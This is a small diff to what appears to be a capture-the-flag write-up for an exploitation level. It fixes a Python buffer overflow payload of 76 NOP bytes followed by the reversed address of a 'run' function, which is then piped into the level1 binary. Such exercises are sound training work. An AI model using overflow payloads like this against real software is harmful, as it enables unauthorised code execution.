@@ -34,7 +34,7 @@ The address of run is : 0x08048444
 Reversed : 0x44840408
 
 python : 
-("\x90" * 76) + "/x44/x84/x04/x08"
+("\x90" * 76) + "\x44\x84\x04\x08"
 
 put the result in a file and use the result of cat to pipe level1
 
